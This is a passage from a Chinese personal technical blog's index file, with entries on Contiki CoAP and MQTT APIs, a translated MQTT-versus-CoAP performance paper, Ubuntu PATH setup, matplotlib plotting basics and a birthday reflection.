put_handler, delete_handler) \ resource_t name = &#123; NULL, NULL, HAS_SUB_RESOURCES, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; NULL &#125; &#125; SEPARATE_RESOURCE separate resource，如果服务器不能立即响应CON请求，它只需用空的ACK消息进行响应，以便客户端可以停止重新发送请求。过了一会儿，当服务器准备好响应时，它将响应作为CON消息发送。以下宏允许创建具有单独响应的CoAP资源： 12#define SEPARATE_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, resume_handler) \ resource_t name = &#123; NULL, NULL, IS_SEPARATE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .resume = resume_handler &#125; &#125; EVENT_RESOURCE event resource，事件资源类似于周期性资源，但第二个处理程序是由非周期性事件调用的，例如按下一个按钮。 12#define EVENT_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, event_handler) \ resource_t name = &#123; NULL, NULL, IS_OBSERVABLE, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .trigger = event_handler &#125; &#125; 如果我们需要声明一个定期的资源，例如轮询传感器并发布更改的值给订阅的客户端，那么我们应该使用： 12345678910/* * Macro to define a periodic resource. * The corresponding [name]_periodic_handler() function will be called every period. * For instance polling a sensor and publishing a changed value to subscribed clients would be done there. * The subscriber list will be maintained by the final_handler rest_subscription_handler() (see rest-mapping header file). */#define PERIODIC_RESOURCE(name, attributes, get_handler, post_handler, put_handler, delete_handler, period, periodic_handler) \ periodic_resource_t periodic_##name; \ resource_t name = &#123; NULL, NULL, IS_OBSERVABLE | IS_PERIODIC, attributes, get_handler, post_handler, put_handler, delete_handler, &#123; .periodic = &amp;periodic_##name &#125; &#125;; \ periodic_resource_t periodic_##name = &#123; NULL, &amp;name, period, &#123; &#123; 0 &#125; &#125;, periodic_handler &#125;; 请注意，PERIODIC_RESOURCE和EVENT_RESOURCE可以被观察到，这意味着可以向客户端通知给定资源中的任何更改。 初始化 初始化REST框架并启动HTTP或CoAP进程 1234/** * \brief Initializes REST framework and starts the HTTP or CoAP process. */void rest_init_engine(void); 激活资源 然后对于每个声明的资源，我们想要访问 123456789/** * * \brief Resources wanted to be accessible should be activated with the following code. * \param resource * A RESTful resource defined through the RESOURCE macros. * \param path * The local URI path where to provide the resource. */void rest_activate_resource(resource_t *resource, char *path); 例如： 定义资源： 123456RESOURCE(res_hello, &quot;title=\&quot;Hello world: ?len=0..\&quot;;rt=\&quot;Text\&quot;&quot;, res_get_handler, NULL, NULL, NULL); 激活资源： 1rest_activate_resource(&amp;res_hello, &quot;test/hello&quot;); 访问资源： 资源的URI路径为：test/hello 获取可用资源列表12345/** * \brief Returns the list of registered RESTful resources. * \return The resource list. */list_t rest_get_resources(void); 强制性CoAP端口是5683]]></content>
      <categories>
        <category>IoT</category>
        <category>CoAP</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>CoAP</tag>
        <tag>Contiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Performance evaluation of MQTT and CoAP via a common middleware]]></title>
    <url>%2F2017%2F07%2F02%2F%E8%AF%91-Performance-evaluation-of-MQTT-and-CoAP-via-a-common-middleware%2F</url>
    <content type="text"><![CDATA[Performance evaluation of MQTT and CoAP via a common middleware（全文翻译） 12345678910Dinesh ThangavelFaculty of Engineering National University of SingaporeXiaoping MaSense and Sense-Abilities, Institute for Infocomm ResearchAlvin ValeraSense and Sense-Abilities, Institute for Infocomm ResearchHwee-Xian TanSense and Sense-Abilities, Institute for Infocomm ResearchColin Keng-Yan TanSchool of Computing National University of Singapore 摘要：无线传感器网络（WSN）通常由在有限资源的设备上操作的传感器节点和网关组成。因此，WSN需要带宽高效和节能的应用协议进行数据传输。消息队列遥测传输（MQTT）和约束应用协议（CoAP）是为资源受限设备提出的两种此类协议。在本文中，我们设计和实现了一个支持MQTT和CoAP的常用中间件，并提供了一个通用的编程接口。我们设计可扩展的中间件来支持未来的协议。使用通用的中间件，我们进行了实验，研究MQTT和CoAP在端到端延迟和带宽消耗方面的性能。实验结果表明，MQTT消息具有比CoAP消息更低的丢包率，延迟低于CoAP消息，丢失率较高的延迟。此外，当消息大小小，损失率等于或小于25％时，CoAP生成比MQTT更低的附加流量，以确保消息的可靠性。 引言无线传感器网络正在部署用于大规模的环境参数测量，如温度，湿度和空气质量在城市和恶劣环境中。典型的WSN部署包括传感器节点和网关。传感器节点测量物理环境并将数据发送到网关节点。网关聚合来自各种传感器节点的数据，然后将数据发送到服务器/代理。 从端到端的角度来看，WSN可以被视为包括两个子网：（i）连接传感器节点和一个或多个网关节点的子网，其中传感器节点路由数据，直到使用WSN协议到达其中一个网关（例如，集合树协议），以及（ii）连接网关和后端服务器或代理的另一子网。由传感器节点生成的传感器数据通过网关传送到服务器。同时，有兴趣接收传感器数据的客户端连接到服务器以获取数据。图1显示了传感器数据如何从传感器节点流向网关，然后传送到服务器，最终传送到客户端的一个示例。 为了将由网关节点收集的所有传感器数据传送到服务器，前者需要一种具有带宽高效、节能且能够处理有限硬件资源（即主存储器和电源）的协议。因此，已经提出了诸如消息队列遥测传输（MQTT）和受限应用协议(CoAP)的协议来专门解决现实世界WSN部署场景的难题。 无线传感器网络将数据从网关传输到客户端的一种方式是“发布-订阅”架构。在这种架构中，需要数据（称为订阅者）的客户端向服务器（也称为代理）注册其兴趣。产生数据的客户端（称为发布者）将数据发送到服务器，该服务器将新鲜数据转发给订阅者。该架构的主要优点之一是需要数据的客户端和发送数据的客户端解耦，即传感器节点不需要知道对其数据感兴趣的客户端的身份，相反，客户端不需要知道生成传感器数据的传感器节点的身份。这种去耦使架构具有高度的可扩展性。“发布订阅”架构由机器到机器（M2M）协议（如MQTT和CoAP）支持。 本文着重于将网关节点处的聚合传感器数据传输到后端服务器或代理。本文有两个新颖的贡献：（i）我们开发了一个常见的中间件，可以根据网关的“发布-订阅”体系结构适应不同的应用协议;和（ii）我们使用普通中间件在不同的网络条件下实验性地评估了CoAP和MQTT的性能。普通中间件的主要优点之一是它能够根据网络条件自适应地选择最合适的协议。 本文的其余部分组织如下：第二部分概述了CoAP和MQTT，并介绍了常见的中间件设计。第三节介绍了用于评估常用中间件的实验设置，第四节提供了实验结果的讨论。第五节终于得出结论。 应用层协议和通用的中间件A. 消息队列遥测传输协议（MQTT） 消息队列遥测传输（MQTT）协议是为资源有限的设备而设计的应用层协议。它使用基于主题的发布订阅体系结构。这意味着当客户端向特定主题T发布消息M时，所有订阅主题T的客户端将接收到消息M。就像超文本传输协议（HTTP），MQTT依赖于传输控制协议（TCP）和IP作为其底层。然而，与HTTP相比，MQTT被设计为具有较低的协议开销。 MQTT中的消息的可靠性由三个服务质量（QoS）等级来考虑。QoS级别0意味着消息最多传送一次，不需要接收确认。QoS级别1意味着每个消息至少传送一次，并且需要确认消息接收。在QoS级别2中，四次握手机制用于一次传递消息。 B. 受限应用协议（CoAP） 约束应用协议（CoAP）是最近开发的应用层协议，旨在用于资源约束设备的通信。该协议基于表征状态传输（REST）架构，并支持像HTTP这样的请求响应模型。除请求响应模型外，CoAP还使用扩展GET方法支持发布订阅模式。与MQTT不同，CoAP的发布订阅模型使用通用资源标识符（URI）而不是主题。这意味着用户将订阅由URI U指定的特定资源。当发布者将数据D发布到URI U时，则所有订阅者都将被通知如D所示的新值。 CoAP和MQTT的主要区别在于，前者运行在用户数据报协议（UDP）之上，而后者运行在TCP之上。由于UDP本质上不可靠，CoAP提供了自己的可靠性机制。这是通过使用“confirmable messages” 和“non-confirmable messages”来实现的。confirmable messages需要确认，而non-confirmable messages不需要确认。 CoAP和MQTT之间的另一个区别是不同QoS级别的可用性。MQTT定义了3个QoS级别，而CoAP不提供差异化的QoS。CoAP和MQTT的主要区别已经在图2中总结了。 C. 通用的中间件 CoAP和MQTT只是为了进行网关到服务器的通信而提出的两种协议，实际上为此提出了许多协议。为了使网关节点具有高度的灵活性，它必须支持各种协议，但同时它必须暴露出一个通用的API来简化网关应用的开发。因此，我们提出一个具有以下功能的常见中间件： 可扩展的，支持现存的和未来的网关到服务器的数据传输协议。 通用API，提供通用的编程接口来访问底层协议的不同功能; 有适应能力的，在将来，中间件可以智能地决定使用给定某些约束的协议。 普通中间件的当前设计和实现如图3所示。开发了一个通用接口，使网关能够使用任何协议将从传感器节点聚合的数据转发到服务器。如上所述，中间件对扩展是开放的，使得新协议可以容易地并入到中间件中。 中间件的公共接口提供诸如publishMessage()和isPublishSuccess()之类的API调用，以发布消息，并检查发布的消息是否已被代理成功接收和接受。虽然MQTT和CoAP的各自的协议实现是不同的，但是发布订阅体系结构的特征被用来创建通用的API调用。例如，API调用publishMessage()接受诸如消息、目的地和主题之类的参数。在MQTT的情况下，通过连接到作为目的地的IP地址的代理将消息发布到主题。在CoAP的情况下，首先使用目标和主题生成URI，然后将消息发布到URI。 这种常见的中间件实现已被用于比较MQTT和CoAP协议的性能。通用网关为协议的比较提供了一个统一的环境，简化了比较过程。比较方案采用的确切方法见第三部分。 实验配置第二部分C中介绍的中间件用于研究MQTT和CoAP协议的性能。实验的目的是确定各种参数对协议性能的影响。根据延迟和每个消息传输的总数据（字节）来衡量协议的性能。每个消息传输的总数据是协议带宽使用的指标。延迟被测量为接收文件（模拟聚合传感器数据）的时间与文件发布时间之间的差异。 硬件配置实验评估中使用的硬件设置包括笔记本电脑，BeagleBoard-xM和上网本，分别作为服务器，发布者，订阅者，一个广域网（WAN）仿真器如图4所示。在通过以太网连接到二层交换机的BeagleBoardxM中部署并执行了常见的中间件实现。这个中间件发挥了发布者的作用，网关发布的消息被路由通过上网本。被称为Wanem 的广域网模拟器应用程序在上网本上运行，以模拟有损网络连接，如Bhattacharyya和Bandyopadhyay所做的以前的工作。 MQTT服务器和CoAP服务器在具有4GB RAM的笔记本电脑中运行，并且该笔记本电脑也连接到第二层交换机，如图4所示。 为了确保计算延迟的时间同步，订阅者程序也在BeagleBoard-xM中运行。因此，BeagleBoard-xM中的中间件发布的任何消息将通过上网本到达笔记本电脑中的服务器，然后通过上网本返回到BeagleBoard-xM。 软件配置MQTT和CoAP协议的开源实现，即Mosquitto和libcoap，与中间件集成，用于进行实验。为了模拟来自传感器节点的数据接收，在BeagleBoard-xM中执行一个小程序来生成传感器数据，而传感器数据又由网关发布。 为了准确计算延迟，由网关发布的每个由用户接收的消息都被记录下来。 Wireshark用于测量整个实验中通过网络传输的字节数。请注意，传输字节的总数包括协议开销以及重传。实验结果见第四节。 实验结果由于简单的实验设置只涉及一个发布者，一个服务器和一个代理，两个协议实现了100%的消息传递率，而不管所有进行的实验中的丢包率如何。这反映了MQTT和CoAP都具有良好的重传方案来处理下层的丢包。因此，我们将我们的比较集中在消息延迟和每个消息生成的数据总量上。 A. 丢包对时延的影响 我们首先考虑丢包对两个协议的延迟性能的影响。任何网络中的分组丢失导致消息的重传，从而导致消息接收中的更长的延迟。为了公平比较，选择MQTT网关QoS 1和用户QoS 1以与CoAP的可确认消息进行比较，因为这两个设置在消息的传输和确认方面是相似的。 表I列举了不同丢包率下两种协议的平均延迟，图6绘制延迟累积分布函数（CDF）。显然，对于较低的数据包丢失值，消息对MQTT的延迟较低。然而，随着分组丢失的增加，CoAP在延迟方面表现优于MQTT。这是因为与丢包率较高时CoAP中较小的UDP开销相比，消息重传中涉及的TCP开销更大。 B. 丢包率对数据传输的影响 每个消息传输的数据被定义为产生的流量总量除以成功传递的消息的总数。它是从Wireshark计算的消息大小为60个字节在不同的损失率值的情况下。网关和订阅者的服务质量也是一样的。图中的曲线图7总结了获得的结果。该图表显示，QoS 2消息与QoS 0和QoS 1相比占用较多的带宽，用于较低的丢包率。这是因为QoS 2中的四次握手机制。QoS 0具有最少的数据传输，因为不需要来自其他主机的确认。 C. 各种消息大小的开销 传输的总数据与总消息大小的比率是数据传输涉及的开销的指标。各种有效负载大小的这个比率如图8所示。较小消息的比率很大，因为确认的大小与消息的大小相当。当消息大小增加时，确认的大小对额外的开销造成的影响很小。额外的开销主要由消息大小和重传次数决定。 当分组丢失率低时，对于所有消息大小，CoAP生成比MQTT少的开销。当丢包率较高时，当消息大小小时，CoAP仍然比MQTT拥有更少的开销。当消息大小增加时，反之亦然。这是因为当消息大小较大时，UDP丢失消息的概率高于TCP，导致CoAP比MQTT更频繁地重发整个消息。 D. 自适应改变协议 第IV-A，IV-B和IV-C节显示，两种协议的性能在不同的网络条件下是不同的。在不同网络条件下使用正确的协议可能会在不同方面提高网络的性能，例如平均消息延迟或每个传递消息生成的数据总量。除了网络条件，应用程序还可以根据不同的应用程序具有不同的要求（如低延迟或低带宽利用率）来决定协议的选择。 为了实现此功能，需要对网关和订阅者增加附加要求。网关必须能够检测网络条件，并且必须具有在不同网络条件下协议性能的先验知识。根据要优化的性能指标，网关将选择在传感器数据传输中使用的最佳协议。订阅者必须能够接收来自不同协议的消息。作为结果，订阅者最好有一个中间件来处理复杂性。我们开发的同样的中间件可以扩展到满足订阅者的要求。 总结与未来的工作在本文中，我们研究了聚合传感器数据从网关节点到后端服务器或代理的传输。我们提出了一个灵活的常见中间件，公开了一个通用的编程接口，可以扩展为适应网络条件。使用通用的中间件，我们研究了MQTT和CoAP的两个最常用的网关到后端数据传输协议的性能。实验结果表明，不同协议的性能取决于不同的网络条件。对于低丢包率的情况，MQTT消息的延迟低于CoAP，而对于高丢包率的情况， MQTT消息的延迟高于CoAP。此外，当消息较小，丢包率等于或小于25%时，由于可靠传输，CoAP比MQTT生成更少的额外流量。 两个协议在性能上的差异可以被来提高网络性能，采用中间件根据当前的网络条件决定使用哪种协议。未来的研究领域包括检测网关上的网络状况，然后切换到为网络条件提供最大性能的协议。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>CoAP</tag>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki中MQTT协议实现（上）]]></title>
    <url>%2F2017%2F06%2F30%2FContiki%E4%B8%ADMQTT%E5%8D%8F%E8%AE%AE%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89%2F</url>
    <content type="text"><![CDATA[6LoWPAN无线传感网络中无线传感节点采用MQTT作为应用层协议是一种很好的选择，通过结合边界路由器、MQTT代理服务器和远程客户端可以实现无线传感网络的数据上传、管理以及远程控制等功能。本文通过Contiki操作系统中实现的MQTT协议来介绍6LoWPAN中MQTT客户端功能的实现。 MQTT简介 MQTT（Message Queuing Telemetry Transport，即消息队列遥测传输协议）是基于TCP/IP协议的基于发布订阅的消息传递协议。它被设计用于与需要“小代码占用”或网络带宽有限的远程位置的连接。 实现MQTT协议需要：客户端和服务器端。 MQTT协议中有三种身份：发布者（Publish）、代理（Broker）（服务器）、订阅者（Subscribe）。其中，消息的发布者和订阅者都是客户端，消息代理是服务器，消息发布者可以同时是订阅者。 MQTT传输的消息分为：主题（Topic）和负载（payload）两部分。 Topic，可以理解为消息的类型，订阅者订阅（Subscribe）后，就会收到该主题的消息内容（payload）payload，可以理解为消息的内容，是指订阅者具体要使用的内容。 MQTT API MQTT 的实现在Contiki的 apps/mqtt 目录下，它使用tcp-socket库，当前在Contiki中MQTT的实现只支持QoS 0和1。 MQTT注册注意：初始化MQTT引擎，必须在使用任何其他MQTT函数之前调用。 1234567891011121314/*** \brief 初始化MQTT引擎.* \param conn 指向MQTT连接的指针.* \param app_process 指向处理MQTT连接的应用程序进程的指针.* \param client_id 指向MQTT客户端ID的指针.* \param event_callback 回调函数负责处理来自MQTT引擎的回调.* \param max_segment_size MQTT/TCP连接的最大TCP分片大小.* \return MQTT_STATUS_OK or MQTT_STATUS_INVALID_ARGS_ERROR*/mqtt_status_t mqtt_register(struct mqtt_connection *conn, struct process *app_process, char *client_id, mqtt_event_callback_t event_callback, uint16_t max_segment_size); MQTT连接123456789101112/*** \brief 连接到一个MQTT代理.* \param conn 指向MQTT连接的指针.* \param host MQTT代理服务器的IP地址.* \param port MQTT代理的MQTT服务端口.* \param keep_alive 保持连接的心跳频率，服务器端从客户端接收消息的最大时间间隔.* \return MQTT_STATUS_OK or an error status*/mqtt_status_t mqtt_connect(struct mqtt_connection *conn, char *host, uint16_t port, uint16_t keep_alive); MQTT断开连接12345/*** \brief 与MQTT代理断开连接.* \param conn 指向MQTT连接的指针.*/void mqtt_disconnect(struct mqtt_connection *conn); MQTT订阅主题123456789101112/*** \brief 订阅一个MQTT主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要订阅的主题的指针.* \param qos_level 服务质量等级.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_subscribe(struct mqtt_connection *conn, uint16_t *mid, char *topic, mqtt_qos_level_t qos_level); MQTT取消订阅12345678910/*** \brief 取消订阅的主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要取消订阅的主题的指针.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_unsubscribe(struct mqtt_connection *conn, uint16_t *mid, char *topic); MQTT发布消息123456789101112131415161718/*** \brief 发布消息到一个MQTT主题.* \param conn 指向MQTT连接的指针.* \param mid 指向message ID的指针.* \param topic 指向要发布消息的主题的指针.* \param payload 指向主题有效载荷的指针.* \param payload_size 有效载荷大小.* \param qos_level 服务质量等级.* \param retain 保持标志，如果RETAIN标志设置为1，则表示服务器要保留这次推送的信息，如果有新的订阅者出现，就把这消息推送给它.* \return MQTT_STATUS_OK or some error status*/mqtt_status_t mqtt_publish(struct mqtt_connection *conn, uint16_t *mid, char *topic, uint8_t *payload, uint32_t payload_size, mqtt_qos_level_t qos_level, mqtt_retain_t retain); MQTT用户名密码123456789/*** \brief 设置MQTT客户端的用户名和密码.* \param conn 指向MQTT连接的指针.* \param username 指向用户名的指针.* \param password 指向密码的指针.*/void mqtt_set_username_password(struct mqtt_connection *conn, char *username, char *password); MQTT遗言 遗言就是一个由客户端预先定义好的主题和对应消息，附加在CONNECT的可变头部中，在客户端连接出现异常的情况下，由服务器主动发布此消息。 1234567891011/*** \brief 为MQTT客户端设置遗言主题和消息* \param conn 指向MQTT连接的指针.* \param topic 指向遗言主题的指针.* \param message 指向遗言消息的指针.* \param qos 服务质量等级.*/void mqtt_set_last_will(struct mqtt_connection *conn, char *topic, char *message, mqtt_qos_level_t qos); MQTT状态检测 可以使用以下帮助函数来声明MQTT连接状态，以检查节点是否连接到代理，如果连接已建立并且缓冲区中有空间可以发布，则使用mqtt_ready。 12345#define mqtt_connected(conn) \((conn)-&gt;state == MQTT_CONN_STATE_CONNECTED_TO_BROKER ? 1 : 0)#define mqtt_ready(conn) \(!(conn)-&gt;out_queue_full &amp;&amp; mqtt_connected((conn))) 参考文献：IPv6-WSN-book：https://github.com/marcozennaro/IPv6-WSN-book]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>6LoWPAN</tag>
        <tag>Contiki</tag>
        <tag>MQTT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]Ubuntu下修改环境变量的三种方法]]></title>
    <url>%2F2017%2F06%2F22%2F%E8%BD%AC-Ubuntu%E4%B8%8B%E4%BF%AE%E6%94%B9%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Ubuntu下设置环境变量有三种方法，一种用于当前终端，一种用于当前用户，一种用于所有用户。 用于当前终端在当前终端中输入： 1export PATH=$PATH:&lt;你的要加入的路径&gt; 不过上面的方法只适用于当前终端，一旦当前终端关闭或在另一个终端中，则无效。 例如： 1export NDK_ROOT=/home/jiang/soft/Android-ndk-r8e 这样只能在当前终端使用。 用于当前用户在用户主目录下有一个 .bashrc 隐藏文件，可以在此文件中加入 PATH 的设置如下： 1$ vi ~/.bashrc 加入： 1export PATH=&lt;你的要加入的路径&gt;:$PATH 例如： 1export PATH=/home/jiang/soft/Android-ndk-r8e:$PATH 如果要加入多个路径，只要： 1export PATH=&lt;你要加入的路径1&gt;:&lt;你要加入的路径2&gt;: ...... :$PATH 当中每个路径要以冒号分隔。 这样每次登录都会生效 用于所有用户1sudo vi /etc/profile 加入： 1export PATH=&lt;你要加入的路径&gt;:$PATH 终端输入：echo $PATH 可以查看环境变量 注意，修改环境变量后，除了第一种方法立即生效外，第二第三种方法要立即生效，可以source ~/.bashrc或者注销再次登录后就可以了！]]></content>
      <categories>
        <category>转载</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python matplotlib学习笔记（一）]]></title>
    <url>%2F2017%2F06%2F18%2FPython-matplotlib%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python数据分析与展示课程之Matplotlib绘图库学习。 简介 Matplotlib 是一个 Python 的 2D绘图库，它以各种硬拷贝格式和跨平台的交互式环境生成出版质量级别的图形。它能让使用者很轻松地将数据图形化，并且提供多样化的输出格式。 pyplot matplotlib.pyplot是绘制各类可视化图形的命令子库，它是是命令行式函数的集合，相当于快捷方式，每一个函数都对图像作了修改，比如创建图形，在图像上创建画图区域，在画图区域上画线，在线上标注等。 安装matplot之前先要安装Numpy，Numpy也是python的一个扩展包，提供基础的科学计算。 安装12python -m pip install -U pip setuptoolspython -m pip install matplotlib 测试 使用matplotlib绘制了x平方在区间[-6，6]的图像： 1234567891011#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**2plt.plot(x,y,&apos;b--&apos;)plt.show() plot函数函数定义 plt.plot(x, y, format_string, **kwargs) 参数说明： x ： X轴数据，列表或数组，可选 y ： Y轴数据，列表或数组 format_string ： 控制曲线的格式字符串，可选 **kwargs ：第二组或更多(x,y,format_string) plt.plot()只有一个输入列表或数组时，参数被当作Y轴，X轴以索引自动生成 plt.plot(x,y)当有两个以上参数时，按照X轴和Y轴顺序绘制数据点 注意：当绘制多条曲线时，各条曲线的x不能省略 format_string format_string：由颜色字符、风格字符和标记字符组成 颜色设置 plot 方法的关键字参数 color(或c) 用来设置线的颜色。 颜色字符 说明 颜色字符 说明 ‘b’ blue 蓝色 ‘y’ yellow 黄色 ‘g’ green 绿色 ‘k’ black 黑色 ‘r’ red 红色 ‘w’ white 白色 ‘c’ cyan 青绿色 ‘#rrggbb’ RGB颜色 ‘m’ magenta 洋红色 ‘0.8’ 灰度值 其中， RGB颜色字符串：(r, g, b) 或 (r, g, b, a)，其中 r g b a 取均为[0, 1]之间 灰度值字符串：[0, 1]之间的浮点数的字符串形式，表示灰度值。0表示黑色，1表示白色 样式设置 plot方法的关键字参数linestyle(或ls)用来设置线条的样式。 样式字符 说明 样式字符 说明 ‘-‘ 实线风格 ‘–’ 虚线风格 ‘-.’ 点划线风格 ‘:’ 虚线风格 ‘’ ‘ ‘ 无线条 标记设置 plot方法的关键字参数marker用来设置标记风格。 标记字符 说明 标记字符 说明 ‘.’ 点标记 ‘,’ 像素标记 ‘o’ 圆圈标记 ‘v’ 下三角标记 ‘^’ 上三角标记 ‘&lt;’ 左三角标记 ‘&gt;’ 右三角标记 ‘1’ 下花三角标记 ‘2’ 上花三角标记 ‘3’ 左花三角标记 ‘4’ 右花三角标记 ‘s’ 正方形标记 ‘p’ 五边形标记 ‘*’ 星标记 ‘h’ 六边形1标记 ‘H’ 六边形2标记 ‘+’ 十字标记 ‘x’ x标记 ‘D’ 菱形标记 ‘d’ 瘦菱形标记 ‘ ‘ 垂直线标记 ‘_’ _标记 markersize(ms)设置标记大小 markerfacecolor(mfc)设置标记颜色 markeredgecolor(mec)设置标记边缘的颜色 markeredgewidth(mew)设置标记边缘的宽度 更多属性设置请参考matplotlib的官方文档。 可以通过格式化参数指定线条的颜色和样式： 例如：’b–*’表示蓝色，虚线，用星号标记点 线条宽度 设置plot方法的关键字参数 linewidth(或lw) 可以改变线条的粗细，其值为浮点数。 线条标签 label : 给所绘制的曲线一个名字 label标签指定的名字在图示(legend)中显示，需在plt.show()之前调用plt.legend()。在字符串前后添加”$”符号，matplotlib会使用其内嵌的latex引擎绘制的数学公式。 图示默认绘制于图的右下角，legend方法可接受一个loc关键字参数来设定图例的位置，可取值为数字或字符串： 数字 字符串 说明 数字 字符串 说明 0 ‘best’ 默认 1 ‘upper right’ 右上角 2 ‘upper left’ 左上角 3 ‘lower left’ 左下角 4 ‘lower right’ 右下角 5 ‘right’ 右侧 6 ‘center left’ 左侧居中 7 ‘center right’ 右侧居中 8 ‘lower center’ 底部居中 9 ‘upper center’ 上方居中 10 ‘center’ 正中间 示例程序 123456789101112131415#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**1z = x**2plt.title(&apos;x and x square&apos;)plt.plot(x,y,&apos;b--&apos;,marker=&apos;+&apos;,label=&quot;$x^2$&quot;) #`b-`是`color=&quot;blue&quot;,linestyle=&quot;-&quot;`的简写形式plt.plot(x,z,color=&apos;r&apos;,linestyle=&apos;--&apos;,marker=&apos;*&apos;,label=&quot;$x^3$&quot;,linewidth=2)plt.legend(loc=1)plt.show() 绘图区域设置绘图区域的概念 在matplotlib中，整个图像为一个Figure对象。在Figure对象中可以包含一个，或者多个Axes对象。每个Axes对象都是一个拥有自己坐标系统的绘图区域。其逻辑关系如下： 一个Figure对应一张图片。Title为标题。Axis为坐标轴，Label为坐标轴标注。Tick为刻度线，Tick Label为刻度注释。 绘制子图plt.subplot(nrows, ncols, plot_number) 在全局绘图区域中创建一个分区体系，并定位到一个子绘图区域 参数说明： nrows ： 将整个绘图区域分成几行 ncols ： 将整个绘图区域分成几列 plot_number ： 当前绘制的区域编号 例如： plt.subplot(3,2,4)，也可省略逗号plt.subplot(324) 示例程序112345678910111213141516#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = x**1z = x**2plt.subplot(2,1,1)plt.plot(x,y)plt.subplot(212)plt.plot(x,z,&apos;r--&apos;)plt.show() 设置图表标题plt.title(‘标题字符串’)用于设置图表的标题。 设置坐标轴 轴区间设置 axis方法：axis([xmin,xmax,ymin,ymax]) 设置x轴的最大最小区间：xlim((xmin,xmax)) 设置y轴的最大最小区间：ylim((ymin,ymax)) 轴标签设置 plt.xlabel()方法用于设置x轴的轴标签 plt.ylabel()方法用于设置x轴的轴标签 设置网格线 plt.grid()函数可以提供是否显示网格的选项，在plot()之后加上grid(True)即可在坐标上显示网格。 保存图像 plt.savefig()将输出图形存储为文件，存储位置为当前python脚本所在目录，默认PNG格式，可以通过dpi修改输出质量。 示例程序21234567891011121314#coding=utf-8import numpy as npimport matplotlib.pyplot as pltx = np.arange(-6,7,1)y = xplt.axis([-6,6,-6,6]) plt.xlabel(&apos;x&apos;)plt.ylabel(&apos;y&apos;)plt.plot(x,y)plt.grid(True) #设置显示网格plt.savefig(&apos;example2&apos;, dpi=600)plt.show()]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Just Twenty Two]]></title>
    <url>%2F2017%2F06%2F17%2FJust-Twenty-Two%2F</url>
    <content type="text"><![CDATA[纪念22岁生日。（拖延症真是太可怕了，本来上个月应该完成的博客还是被我拖到了现在）。 5月20日，我的22岁生日，然而21日就是毕业设计答辩，答辩前一天生日确实有点尴尬，为了认真完成毕业答辩，于是把生日庆祝推迟了一天。不过，生日这天还是接到了很多祝福。 回忆起大学的四个生日，有和大家一起过的，也有默默度过的，或许我本来就是一个不太爱热闹的人，不希望太多人记得我的生日，不希望大家为我庆生，因为我真的是一个喜欢安静的人。另外，我对于有些事情是很懒的，从来不喜欢去记别人的生日，每次别人记得我的生日都会让我感到很惭愧。 不过，每次大家给我过生日我还是很感动很开心的，感谢为我庆生的老铁们。这次的生日，感谢一直记得我生日的家人，在群里给我发红包，祝我生日快乐，突然有点想回家了。 21日轻松完成答辩，准备晚上出去嗨一顿，3个室友加上领导和钟善良，虽然没有太多的人，但是吃了最好吃的蛋糕，唱了最满意的歌，吃了最喜欢的小龙虾，感觉真的很幸福了。谢谢室友的陪伴，谢谢领导和钟善良的蛋糕，答辩完，好多感触，谢谢你们陪我喝酒。 听到你们喊我部长我就很开心，更何况看到蛋糕上还是大写的Wuli 部长呢，哈哈哈哈哈。很多次说要戒酒，可是总忍不住要和大家一起喝。我就是这样一个人，有人陪我喝酒我就会很开心呀，因为我觉得很多人喝酒之后都会不一样，都会变得特别有意思。嗯，有你们陪我我就很开心了。可是，以后大概也真的很难再聚在一起喝酒了吧！ 以后，天南地北，我们过生日的时候也很难在一起聚了，只是，希望我们都能一直幸福下去，希望以后你们的朋友也像我一样爱你们（哈哈，找不到有钟傻傻的合照了，将就将就吧）。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[愿你以后的朋友像我一样爱你]]></title>
    <url>%2F2017%2F06%2F16%2F%E6%84%BF%E4%BD%A0%E4%BB%A5%E5%90%8E%E7%9A%84%E6%9C%8B%E5%8F%8B%E5%83%8F%E6%88%91%E4%B8%80%E6%A0%B7%E7%88%B1%E4%BD%A0%2F</url>
